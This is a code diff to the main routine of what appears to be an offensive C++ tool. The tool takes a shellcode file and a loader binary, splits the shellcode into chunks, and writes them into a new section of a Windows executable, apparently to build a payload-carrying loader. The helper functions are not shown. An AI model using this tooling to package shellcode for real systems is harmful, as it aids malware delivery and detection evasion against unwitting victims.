@@ -2,6 +2,8 @@
 #include <iostream>
 #include <time.h>
 #include "Utils.h"
+#include "FakeEntry.h"
+
 void PrintBanner() {
 	LPCSTR banner =
 		"                                                                      \n"
@@ -15,7 +17,7 @@ void PrintBanner() {
 }
 
 void PrintHelp(LPCSTR exeName) {
-	std::cout << "[+] Usage: " << exeName << "<Shellcode File> <Output Name>";
+	std::cout << "[+] Usage: " << exeName << " <Shellcode File> <Output Name>";
 }
 
 
@@ -28,6 +30,8 @@ int main(int argc, char* argv[]) {
 	srand(time(NULL));
 	size_t shellcodeSize = 0;
 	size_t loaderSize = 0;
+	size_t newPESize = 0;
+	uint64_t numberOfChunks = 0;
 	PBYTE shellcodeContent = ReadFileFromDisk(argv[1], shellcodeSize);
 	if (shellcodeContent == NULL || shellcodeSize == 0) {
 		std::cout << "[!] Error on reading the shellcode file !" << std::endl;
@@ -41,6 +45,20 @@ int main(int argc, char* argv[]) {
 	PBYTE loaderContent = ReadFileFromDisk(loaderPath, loaderSize);
 	if (loaderContent == NULL || loaderSize == 0) {
 		std::cout << "[!] Error on reading the loader binary !" << std::endl;
+		return -1;
+	}
+	PBYTE hintArray = SplitShellcode(shellcodeContent, shellcodeSize, numberOfChunks);
+	if (hintArray == NULL || numberOfChunks == 0) {
+		std::cout << "[!] Splitting shellcode problem !" << std::endl;
+		return -1;
+	}
+	PBYTE newPeFileContent = AddNewSection(loaderContent, loaderSize, numberOfChunks, newPESize);
+	if (newPeFileContent == NULL || newPESize == 0) {
+		std::cout << "[!] Appending new section problem !" << std::endl;
+		return -1;
+	}
+	if (!WriteNewPE(argv[2], newPeFileContent, newPESize)) {
+		std::cout << "[!] Error on writing !" << std::endl;
 		return -1;
 	}
 	return 0;
